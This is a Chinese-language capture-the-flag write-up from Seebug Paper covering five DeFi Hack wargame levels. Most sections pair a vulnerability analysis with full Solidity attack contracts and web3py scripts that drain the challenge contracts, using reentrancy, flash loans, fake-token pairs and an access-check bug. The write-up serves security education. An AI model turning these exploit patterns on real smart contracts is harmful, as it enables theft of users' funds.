**作者：0x9k  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

## 前言

DeFi Hack是根据真实世界DeFi中出现的漏洞为模板，抽象而来的wargame。用以提高学习者挖掘、利用DeFi智能合约漏洞的技能[1]。
![](https://images.seebug.org/content/images/2022/04/217b76d3-088b-41ee-86f1-a07c4d5c6115.png-w331s)

## May The Force Be With You

### 题目描述

![](https://images.seebug.org/content/images/2022/04/b6bf82c7-1712-4f26-abe2-a985e102e73d.png-w331s)
本关目标是从MayTheForceBeWithYou合约中盗取所有的YODA token，难度三颗星。

### 合约代码分析

YODA token是自实现的ERC20，自己实现了transfer方法。
**其自实现的doTransfer方法在token数量不足的情况下，并没有revert，而仅仅只是返回false。**

![](https://images.seebug.org/content/images/2022/04/4cf50653-cdda-45e5-89ba-20bf63a934bf.png-w331s)

### 攻击

![](https://images.seebug.org/content/images/2022/04/9e6a856e-0a1a-412b-a66b-f00ca1b8eca8.png-w331s)

![](https://images.seebug.org/content/images/2022/04/04f04b6d-0fe5-4e7f-9ffe-610eaf7973ac.png-w331s)
图1-1 攻击前合约余额
![](https://images.seebug.org/content/images/2022/04/3203fe97-f161-48c2-889b-9c042f2078b9.png-w331s)
图1-2 攻击步骤

### 真实场景

![](https://images.seebug.org/content/images/2022/04/8ef76e14-f89f-4db9-8c01-0a88d1a478d0.png-w331s)
<https://blog.forcedao.com/xforce-exploit-post-mortem-7fa9dcba2ac3>

## DiscoLP

### 题目描述

![](https://images.seebug.org/content/images/2022/04/9891d5c2-0f96-438e-be7e-5d4db972cab1.png-w331s)

本关基于Uniswap2实现了一个自己的流动性池DiscoLP(流动性token为DISCO)，配对了JIMBO和JAMBO两种token。初始时给定player
1JIMBO和1JAMBO，期望用户获得100流动性token DISCO。难度七颗星。

### 合约代码分析

![](https://images.seebug.org/content/images/2022/04/4ecc30b6-c467-49cc-b7f7-c40b686dbe70.png-w331s)

**depositToken函数没有针对传入的token(可控)进行有效性判断**
(判断是否为JIMBO、JAMBO)。致使后续在Uniswap路由中判断配对合约时并不是JIMBO&JAMBO，而是用户传入的token和配对合约中的一个token。

### 攻击

恶意构造一个token并mint，与配对合约中的tokenA创一个新的配对合约到Uniswap。调用depositToken获取得到超过100流动性的DISCO，再把获取的流动性token由攻击者合约转给player即可。

    
    
    pragma solidity >=0.6.5;
    
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol";
    
    interface IDiscoLP {
         function depositToken(address _token, uint256 _amount, uint256 _minShares) external;
         function balanceOf(address from) external returns (uint256);
         function approve(address spender, uint256 amount) external returns (bool);
         function transfer(address recipient, uint256 amount) external returns (bool);
    }
    
    contract Token is ERC20 {
        constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public {
            _mint(msg.sender, 2**256 - 1);
        }
    }
    
    
    library $ {
      address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten
      address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten
    }
    
    interface IUniswapV2Factory {
      event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    
      function getPair(address tokenA, address tokenB) external view returns (address pair);
      function allPairs(uint) external view returns (address pair);
      function allPairsLength() external view returns (uint);
    
      function feeTo() external view returns (address);
      function feeToSetter() external view returns (address);
    
      function createPair(address tokenA, address tokenB) external returns (address pair);
    }
    
    interface IUniswapV2Router {
        function WETH() external pure returns (address _token);
        function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);
        function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);
        function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);
        function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);
        function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);
    }
    
    interface IPair {
        function token0() external view returns (address _token0);
        function token1() external view returns (address _token1);
        function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);
        function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);
        function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
        function mint(address _to) external returns (uint256 _liquidity);
        function sync() external;
    }
    
    contract DiscoLPAttack {
    
        function getToken0(address pair) public view returns(address) {
            return IPair(pair).token0();
        }
    
        function atttack(address instance, uint256 amount, address tokenA) public payable {
            address _factory = $.UniswapV2_FACTORY;
            address _router = $.UniswapV2_ROUTER02;
    
            ERC20 evilToken = new Token("Evil Token", "EVIL");
    
            address pair = IUniswapV2Factory(_factory).createPair(address(evilToken), address(tokenA));
            evilToken.approve(instance, uint256(-1));
            evilToken.approve(_router, uint256(-1));
            IERC20(tokenA).approve(_router, uint256(-1));
    
            (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(
              address(evilToken),
              address(tokenA),
              1000000 * 10 ** 18,
              1 * 10 ** 18,
              1, 1, address(this), uint256(-1));
    
    
            IDiscoLP(instance).depositToken(address(evilToken), amount, 1);
        }
    
        function transferDiscoLP2Player(address instance, address player) public payable {
            uint256 balance = IDiscoLP(instance).balanceOf(address(this));
            IDiscoLP(instance).approve(address(this), uint256(-1));
            IDiscoLP(instance).transfer(player, balance);
        }
    }
    
    
    /**
     *  step1: get reserveToken() from instance
     *  step2: deploy attack contract
     *  step3: get token0 on pair attack.getToken0(reserveToken)
     *  step4: token0.transfer(attack contract, 1 * 10 ** 18)
     *         Token contract At Address in remix then transfer
     *  step5: attack contract attack(instance, 1000000 * 10 ** 18, token0)
     *  step6: transferDiscoLP2Player(instance, player)
     *  step7: in DiscoLP balanceOf(player)
     **/

### 真实场景

![](https://images.seebug.org/content/images/2022/04/f3c22b17-0e54-4a37-b086-c4cb9ece880e.png-w331s)
<https://growthdefi.medium.com/raave-farming-contract-exploit-explained-f3b6f0b3c1b3>

## P2PSwapper

### 题目描述

![](https://images.seebug.org/content/images/2022/04/221bdb06-034a-40a5-8d67-a77b25e2b132.png-w331s)
本关实现了一个零信任的DEX，并提供了交易相关的操作(创建createDeal、处理takeDeal、取消cancleDeal等)。目标是盗取P2PSwapper
合约中所有的WETH token。难度五颗星。

### 合约代码分析

![](https://images.seebug.org/content/images/2022/04/eecaf4bc-c5f6-4154-a14b-883d794e4ecc.png-w331s)
![](https://images.seebug.org/content/images/2022/04/024be001-9d77-4a66-8ddf-56e22997b847.png-w331s)

默认partnerById和userByAddress并未初始化，当withdrawFees的user不存在，能bypass检查，使得userByAddress[msg.sender]
== 0 == partnerById[userId]。从而实现多次withdrawFees，最终实现提取完合约P2PSwapper中的WETH。

### 攻击

    
    
    /**
     *  1. 初始时P2PSwapper中的weth token，balanceOf(instance) == 313337+1 = 313338
     *       instance.createDeal{value: 313337}(p2pweth, 1, p2pweth, 1000000000000);
     *       partnerFees[0] = 313338/2 = 1566669
     * 
     *  2. 攻击者player调用p2pweth.deposit(1eth)
     *  3. 攻击者player调用approve(instance, 10eth = 1*10^19 = 10000000000000000000)完成授权
     *  4. 攻击者player调用P2PSwapper.createDeal(p2pweth, 1, p2pweth, 1) (value:3133338)
     *      此时P2PSwapper合约instance的余额 balanceOf(instance) = 313338+1+3133338 = 3446677
     * 
     *  5. 攻击者player调用P2PSwapper.withdrawFees(player2)提取到一个未注册&初始化的用户地址player2
     *      此时P2PSwapper合约instance的余额 balanceOf(instance) = 3446677 - partnerFees[0] = 3446677 - 1566669 = 1880008
     * 
     *  6. 攻击者player调用P2PSwapper.withdrawFees(player3)提取到一个未注册&初始化的用户地址player3
     *       此时P2PSwapper合约instance的余额 balanceOf(instance)  = 1880008 - partnerFees[0] = 1880008 - 1566669 = 313339
     *      
     *  7. 继续withdrawFees合约余额是不足的，需要稍加计算先给合约转入weth p2pweth.transfer(instance) = 1253330
     *      此时P2PSwapper合约instance的余额 balanceOf(instance) = 313339 + 1253330 = 1566669 = partnerFees[0]
     * 
     *  8. 攻击者player调用P2PSwapper.withdrawFees(player4)提取到一个未注册&初始化的用户地址player4
     *      此时P2PSwapper合约instance的余额 balanceOf(instance) = 1566669 - partnerFees[0] = 1566669 - 1566669 = 0
     * 
     *  done
    **/

![](https://images.seebug.org/content/images/2022/04/7160cf6e-a455-401a-b067-eedaf01f9626.png-w331s)
图2-1 P2PSwapper合约余额
![](https://images.seebug.org/content/images/2022/04/8f5f8af0-ff3c-41ad-a710-fcbb651fda7e.png-w331s)
图2-2 创建交易
![](https://images.seebug.org/content/images/2022/04/ae9d0181-caa0-46d4-8309-2fed2d70f9f4.png-w331s)
图2-3 withdrawFees
![](https://images.seebug.org/content/images/2022/04/4e09571e-60b2-4f8a-8630-9c18d07432f3.png-w331s)
图2-4 攻击步骤8完成以后P2PSwapper合约余额

上述过程可以利用web3py&web3js编写自动化脚本。web3py攻击脚本如下:

    
    
    # -*-coding:utf-8-*-    __author__ = 'joker'
    
    import json
    import time
    from web3 import Web3, HTTPProvider
    from web3.gas_strategies.time_based import fast_gas_price_strategy, slow_gas_price_strategy, medium_gas_price_strategy
    
    # infura_url = 'https://ropsten.infura.io/v3/xxxx'
    infura_url = 'http://127.0.0.1:7545'
    web3 = Web3(Web3.HTTPProvider(infura_url, request_kwargs={'timeout': 600}))
    
    web3.eth.setGasPriceStrategy(fast_gas_price_strategy)
    gasprice = web3.eth.generateGasPrice()
    print("[+] fast gas price {0}...".format(gasprice))
    
    player_private_key = ''
    player_account = web3.eth.account.privateKeyToAccount(player_private_key)
    web3.eth.defaultAccount = player_account.address
    print("[+] account {0}...".format(player_account.address))
    player2_address = ''
    player3_address = ''
    player4_address = ''
    
    
    def send_transaction_sync(tx, account, args={}):
        args['nonce'] = web3.eth.getTransactionCount(account.address)
        signed_txn = account.signTransaction(tx.buildTransaction(args))
        tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
        time.sleep(30)
        return web3.eth.waitForTransactionReceipt(tx_hash)
    
    challenge_address = ""
    with open('./P2PSwapper/challenge.abi', 'r') as f:
        abi = json.load(f)
    challenge_contract = web3.eth.contract(address=challenge_address, abi=abi)
    p2pweth_address = challenge_contract.functions.p2pweth().call()
    
    print("[+] p2pweth {0}...".format(p2pweth_address))
    with open('./P2PSwapper/p2pweth.abi', 'r') as f:
        abi = json.load(f)
    p2pweth_contract = web3.eth.contract(address=p2pweth_address, abi=abi)
    
    
    # p2pweth.deposit(1eth)
    print("[+] step1 player p2pweth deposit 1eth...")
    tx = p2pweth_contract.functions.deposit()
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice, 'value': 1000000000000000000})
    #
    
    # approve(instance, 10eth = 1*10^19 = 10000000000000000000)
    print("[+] step2 player approve(instance, 10eth = 1*10^19 = 10000000000000000000)...")
    tx = p2pweth_contract.functions.approve(guy=challenge_address, wad=10000000000000000000)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    # P2PSwapper.createDeal(p2pweth, 1, p2pweth, 1) (value:3133338)
    print("[+] step3 createDeal(p2pweth, 1, p2pweth, 1) with player (value:3133338)...")
    tx = challenge_contract.functions.createDeal(bidToken=p2pweth_address, bidPrice=1, askToken=p2pweth_address, askAmount=1)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice, 'value': 3133338})
    #
    
    # P2PSwapper.withdrawFees(player2)
    print("[+] step4 withdrawFees(player2) from player...")
    tx = challenge_contract.functions.withdrawFees(user=player2_address)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    # P2PSwapper.withdrawFees(player3)
    print("[+] step5 withdrawFees(player3) from player...")
    tx = challenge_contract.functions.withdrawFees(user=player3_address)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    # p2pweth.transfer(instance) = 1253330
    print("[+] step6 p2pweth.transfer(instance) = 1253330...")
    tx = p2pweth_contract.functions.transfer(dst=challenge_address, wad=1253330)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    # P2PSwapper.withdrawFees(player4)
    print("[+] step7 withdrawFees(player2) from player...")
    tx = challenge_contract.functions.withdrawFees(user=player4_address)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    print('[+] Solved {0} ...'.format(p2pweth_contract.functions.balanceOf(challenge_address).call() == 0))

![](https://images.seebug.org/content/images/2022/04/ecd1a7d7-40c1-4ce2-8034-448ae15b3c2c.png-w331s)
图2-5 web3py自动化攻击结果

### 真实场景

![](https://images.seebug.org/content/images/2022/04/5478f55f-e39e-4151-9737-7a31566c16b6.png-w331s)

## FakerDAO

### 题目描述

![](https://images.seebug.org/content/images/2022/04/d3541908-cf4e-4264-93ea-d69a06559a11.png-w331s)
本关是一个基于Uniswap实现的DAO合约，使用YIN&YANG实现配对合约。初始时player拥有5000YIN&5000YANG，目标从FakerDAO合约中借取1LAMBO的流动性代币。难度七颗星。

### 合约代码分析

![](https://images.seebug.org/content/images/2022/04/fc320321-7bbc-40c4-b7f6-5dba55ea7ad7.png-w331s)

很明显，利用Uniswap的闪电贷属性[2]，完成借贷并在闪电贷过程中调用FakerDAO合约的borrow获取流动性token，然后归还闪电贷即可。闪电贷[2]需要实现IUniswapV2Callee接口的uniswapV2Call方法。

### 攻击

首先从攻击合约中获取配对合约token0&token1，把player拥有的初始化token，转给攻击合约，攻击合约实现uniswapV2Call接口，利用闪电贷(Flash
Loan)完成借贷，并调用FakerDAO.borrow方法获取流动性token，最后归还闪电贷。

    
    
    pragma solidity ^0.6.0;
    
    import "https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
    import "./UniswapV2Library.sol";
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/IERC20.sol";
    
    
    contract FakerDAOAttack is IUniswapV2Callee{
    
        address public instance;
    
    
        function attack(address _instance, address _pair, uint256 amount0Out, uint256 amount1Out) public {
    
            instance = _instance;
    
            // (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();
            address token0 = Pair(_pair).token0();
            address token1 = Pair(_pair).token1();
            address _router = $.UniswapV2_ROUTER02;
    
            IERC20(token0).approve(_router, uint256(-1));
            IERC20(token1).approve(_router, uint256(-1));
            IERC20(_pair).approve(_instance, uint256(-1));
    
    
            // add liquidity
             (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(
              token0,
              token1,
              1500 * 10 ** 18,
              1500 * 10 ** 18,
              1, 1, address(this), uint256(-1));
    
    
              Pair(_pair).swap(amount0Out, amount1Out, address(this), bytes('not empty'));
        }
    
    
        function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external override {
    
            // address[] memory path = new address[](2);
            // uint amountToken = _amount0 == 0 ? _amount1 : _amount0;
    
            address token0 = Pair(msg.sender).token0();
            address token1 = Pair(msg.sender).token1();
    
            require(msg.sender == UniswapV2Library.pairFor($.UniswapV2_FACTORY, token0, token1),'Unauthorized');
    
            FakerDAO(instance).borrow(1);
    
            // transfer into pair(msg.sender)
                    // return flash loan 
            IERC20(token0).transfer(msg.sender, IERC20(token0).balanceOf(address(this)));
            IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        }
    
        function toPlayer() public {
            FakerDAO(instance).transfer(msg.sender, 1);
        }
    }
    
    
    interface FakerDAO is IERC20 {
        function borrow(uint256 _amount) external;
    }
    
    
    
    library $
    {
        address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten
        address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten
    }
    
    interface Pair is IERC20
    {
        function token0() external view returns (address _token0);
        function token1() external view returns (address _token1);
        function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);
        function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);
        function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
        function mint(address _to) external returns (uint256 _liquidity);
        function sync() external;
        function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    }
    
    interface IUniswapV2Router {
        function WETH() external pure returns (address _token);
        function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);
        function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);
        function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);
        function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);
        function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);
    }
    
    
    /**
     * steps:
     * 1) get token0 and token1 on contract.pair
     * 2) deploy FakerDAOAttack
     * 3) token0.transfer(FakerDAOAttack, 5000000000000000000000) from player
     * 4) token1.transfer(FakerDAOAttack, 5000000000000000000000) from player
     * 5) FakerDAOAttack.attack(instance, pair, 1, 999999999999999999999999)
     * 6) FakerDAOAttack.toPlayer 
    */

![](https://images.seebug.org/content/images/2022/04/a9f40991-21ce-4855-a83f-a168dfc2f914.png-w331s)
图3-1 完成攻击后提交检验结果

### 真实场景

![](https://images.seebug.org/content/images/2022/04/c21596b5-526f-4b42-87b3-b2c020bfe484.png-w331s)
<https://slowmist.medium.com/analysis-of-warp-finance-hacked-incident-cb12a1af74cc>

## Main Khinkal Chef

### 题目描述

![](https://images.seebug.org/content/images/2022/04/f0386426-8796-4e80-8555-e01e35c77b68.png-w331s)

本关MainChef合约实现了流动性池管理的工具，可以通过add添加池子Pool信息，随着区块时间的变化，会针对Pool池子进行奖励(通过updatePool完成)。奖励通过代币KhinkalToken进行发放，每当池子更新，MainChef合约都会mint对应的奖励代币KhinkalToken，目标是盗取MainChef合约中所有的KHINKAL
token。难度五颗星。

### 合约代码分析

![](https://images.seebug.org/content/images/2022/04/943066ac-a2b3-4e38-9c7a-e922a4e95122.png-w331s)
图4-1 设置管理员检查存在漏洞

setGovernance用以修改管理员，检查逻辑存在严重错误，可以修改管理员，从而实现向合约中添加新的token即形成新的Pool。正确的检查逻辑应该如下(多了一个下划线，导致和参数一致):

    
    
    require(msg.sender == owner() || msg.sender == governance, "Access denied");

![](https://images.seebug.org/content/images/2022/04/06bb1201-62af-43ec-9c32-458f59e0fa3c.png-w331s)
图4-2 管理员添加新token

有了管理员权限之后，可以添加任意的token(evil token)。

![](https://images.seebug.org/content/images/2022/04/0594c768-260b-4e2b-8131-885c9ec232d0.png-w331s)
图4-3 token可控

在任意添加token之后，token的transferfrom为攻击者可控的恶意函数。

![](https://images.seebug.org/content/images/2022/04/3de2e061-cb24-40f1-96ca-625de7ccbf14.png-w331s)
图4-4 token可控&重入攻击

由于token可控，user.amount在token.transfer之后重置，致使可以利用重入攻击多次withdraw，从而实现抽干合约中的代币。

![](https://images.seebug.org/content/images/2022/04/146de2ff-3309-4afd-8caa-df4fbe3d3afa.png-w331s) 图4-5 控制是否更新奖励

由于token可控，token的balanceOf函数可控，利用lpSupply可以控制是否奖励，这在后续攻击中需要用到，用来计算此时MainChef中的奖励代币KhinkalToken数量。

### 攻击

![](https://images.seebug.org/content/images/2022/04/b4604019-66d7-4805-8887-65e1fa456210.png-w331s)
图4-6 代币奖励与区块高度

由于奖励代币KhinkalToken和区块高度息息相关，在真实场景中交易频繁，为了很好的实现精准控制，需要针对重入攻击(token.tranfser)进行精确布局，以保证能自适应区块高度的变化。

![](https://images.seebug.org/content/images/2022/04/ab666c47-d979-477e-82f3-4dfa33735178.png-w331s)
图4-7 重入攻击中精准计算进行控制

完整的攻击代码分为攻击合约&攻击脚本web3py，攻击脚本进行相关的计算并调用攻击合约完成攻击。 攻击合约如下:

    
    
    // SPDX-License-Identifier: MIT
    
    pragma solidity 0.6.12;
    
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/IERC20.sol";
    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/access/Ownable.sol";
    import "./KhinkalToken.sol";
    
    interface IMainChef {
        function setGovernance(address _governance) external;
        function withdraw(uint256 _pid) external;
        function deposit(uint256 _pid,uint256 _amount) external;
        function addToken(IERC20 _lpToken) external; 
        function updatePool(uint256 _pid) external;
    }
    
    
    contract MainChefAttack is Ownable {
        IMainChef target;
        uint pwnedtransferFlag;
        uint pwnedtransferFromFlag;
        uint balanceOfFlag;
        uint256 pid;
        KhinkalToken khinkal;
        uint256 accKhinkalPerShare;
    
        constructor(address _target, address _token) public {
            target = IMainChef(_target);
            khinkal = KhinkalToken(_token);
            balanceOfFlag = 1;
            pid = 1;
            pwnedtransferFlag = 0;
        }
    
        function setAccKhinkalPerShare(uint256 _accKhinkalPerShare) public onlyOwner {
            accKhinkalPerShare = _accKhinkalPerShare;
        }
    
    
        // function balanceOf(address account) public view virtual returns (uint256) {
        function balanceOf(address account) public virtual returns (uint256) {
            if (balanceOfFlag == 1) {
                return 0;
            } else {
                return 1e18;
            }
        }
    
    
        function transfer(address recipient, uint256 amount) public virtual returns (bool) {
            // reentrant attack exp
            if (pwnedtransferFlag == 1) {
                pwnedtransferFlag = 2;
                if (khinkal.balanceOf(address(target)) > 0) {
                    target.withdraw(pid);
                }
                return true;
            }
            if (pwnedtransferFlag == 2) {
                // 1 + 78333646677 = 78333646678
                // withdraw 500004127749479808 * 2
                uint256 leftBalanceChallenge = khinkal.balanceOf(address(target));
                uint256 withdrawBalance = 500004127749479808 * accKhinkalPerShare / 1e12;
    
                if (leftBalanceChallenge < withdrawBalance) {
                     khinkal.transfer(address(target), withdrawBalance - leftBalanceChallenge);
                } else if (leftBalanceChallenge < 2 * withdrawBalance) {
                    khinkal.transfer(address(target), 2 * withdrawBalance - leftBalanceChallenge);
                }
    
                pwnedtransferFlag = 3;
                if (khinkal.balanceOf(address(target)) > 0) {
                    target.withdraw(pid);
                }
                return true;
            }
            if (pwnedtransferFlag == 3) {
                pwnedtransferFlag = 0;
                if (khinkal.balanceOf(address(target)) > 0) {
                    target.withdraw(pid);
                }
                return true;
            }
            return true;
        }
    
        // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol
        function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
            return true;
        }
    
    
        function attackPwnedPrepare() public payable onlyOwner {
            target.setGovernance(address(this));
            target.addToken(IERC20(address(this)));
    
            // after 5 block number
            /** 
             *  internal 5 block number
                khinkalReward = 5 * 31333333337 / 2  = 78333333342
                accKhinkalPerShare = khinkalReward * 1e12 /1e18
                                   = 78333333342 * 1e12 / 1e18
                                   = 78333
                instance = 313337 + khinkalReward
                         = 313337 + 78333333342
                         = 78333646679
                lastKhinkalReward = khinkalReward = 78333333342
    
                bypass require(pending <= pool.lastKhinkalReward, "Reward bigger than minted");
                78333646679
                78333646679 / 2 = 39166823339
               >>> "%.40f" %(39166823339*1e12/78333)
              '500004127749479808.0000000000000000000000000000000000000000'
            */
            target.deposit(pid, 500004127749479808);
        }
    
        function attackUpdatePool() public payable onlyOwner {
            balanceOfFlag = 0;
            target.updatePool(pid);
            balanceOfFlag = 1;
        }
    
        function attackPwned() public payable onlyOwner {
            pwnedtransferFlag = 1;
            target.withdraw(pid);
        }
    
    
        function validateInstanceAddress() public view returns (bool) {
            return khinkal.balanceOf(address(target)) == 0;
        }
    
    
        function getInstance() public view returns (address) {
            return address(target);
        }
    
    
        function getTokenAddress() public view returns (address) {
            return address(khinkal);
        }
    }
    
    
    /**
     *  1. deployed MainChefAttack
     *  2. MainChefAttack.attackPrepare()
     *  3. MainChefAttack.attackUpdatePool()
     *  4. MainChefAttack.setAccKhinkalPerShare()
     *  3. MainChefAttack.attackPwned()
    */

攻击脚本如下:

    
    
    # -*-coding:utf-8-*-    __author__ = 'joker'
    
    import json
    import time
    from web3 import Web3, HTTPProvider
    from web3.gas_strategies.time_based import fast_gas_price_strategy, slow_gas_price_strategy, medium_gas_price_strategy
    
    infura_url = 'https://ropsten.infura.io/v3/xxxx'
    # infura_url = 'http://127.0.0.1:7545'
    web3 = Web3(Web3.HTTPProvider(infura_url, request_kwargs={'timeout': 600}))
    
    
    web3.eth.setGasPriceStrategy(fast_gas_price_strategy)
    gasprice = web3.eth.generateGasPrice()
    print("[+] fast gas price {0}...".format(gasprice))
    
    player_private_key = ''
    player_account = web3.eth.account.privateKeyToAccount(player_private_key)
    web3.eth.defaultAccount = player_account.address
    print("[+] account {0}...".format(player_account.address))
    
    
    def send_transaction_sync(tx, account, args={}):
        args['nonce'] = web3.eth.getTransactionCount(account.address)
        signed_txn = account.signTransaction(tx.buildTransaction(args))
        tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
        time.sleep(30)
        return web3.eth.waitForTransactionReceipt(tx_hash)
    
    
    print("[+] step0 deployed attack contract...")
    with open('./attack.abi', 'r') as f:
        abi = json.load(f)
    with open('./attack.bin', 'r') as f:
        code = json.load(f)['object']
    attack_contract = web3.eth.contract(bytecode=code, abi=abi)
    challenge_address = ""
    token_address = ""
    tx = attack_contract.constructor(_target=challenge_address,
                                     _token=token_address)
    attack_contract_address = send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})[
        'contractAddress']
    print("[+] attack contract address {0}...".format(attack_contract_address))
    attack_contract = web3.eth.contract(address=attack_contract_address, abi=abi)
    
    # step1 attackPrepare
    print("[+] step1 attackPwnedPrepare...")
    tx = attack_contract.functions.attackPwnedPrepare()
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    block_number = web3.eth.blockNumber
    print("[+] block number {0}...".format(block_number))
    print("[+] waiting for reach block number...")
    while web3.eth.blockNumber != block_number + 4:
        # print("[-] waiting ...")
        continue
    
    # step2 attackUpdatePool
    print("[+] step2 attackUpdatePool...")
    tx = attack_contract.functions.attackUpdatePool()
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    input("any key to continue...")
    # sometimes u can not get accurate block number of 4 maybe more
    # to adapt to we need calc and tranfser
    # uint256 leftBalanceChallenge = khinkal.balanceOf(address(target));
    # uint256 withdrawBalance = 500004127749479808 * accKhinkalPerShare / 1e12;
    # if (leftBalanceChallenge < 2 * withdrawBalance)
    #    khinkal.transfer(address(target),2 * withdrawBalance - leftBalanceChallenge);
    # set accKhinkalPerShare to attack contract for calcing
    print("[+] get accKhinkalPerShare and set it to attack contract...")
    with open('./challenge.abi', 'r') as f:
        abi = json.load(f)
    challenge_contract = web3.eth.contract(address=challenge_address, abi=abi)
    accKhinkalPerShare = challenge_contract.functions.poolInfo(1).call()[3]
    tx = attack_contract.functions.setAccKhinkalPerShare(_accKhinkalPerShare=accKhinkalPerShare)
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    # step3 attackPwned
    print("[+] step3 attackPwned...")
    tx = attack_contract.functions.attackPwned()
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    
    # check
    print('[+] Solved {0} ...'.format(attack_contract.functions.validateInstanceAddress().call()))
    #

![](https://images.seebug.org/content/images/2022/04/9917020d-91d4-4460-90aa-366ecc441749.png-w331s)
图4-8 完整攻击过程

### 真实场景

![](https://images.seebug.org/content/images/2022/04/89f577db-68e8-419e-9472-f912b43cc700.png-w331s)
<https://github.com/IceCreamSwap/contracts/blob/7e433aa1d2633665b95a12687a17fc84d2a9c1ac/farm-contracts/MasterChef.sol>

## Reference

[1] <https://mobile.twitter.com/theraz0r/status/1395288985740664834>  
[2]
<https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol>

## 附录

本地测试合约代码&攻击合约代码见<https://github.com/0x9k/blockchain/defihack_xyz>  
本地测试合约统一从Factory进行部署，部署获取得到instance即为关卡合约地址。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1880/>

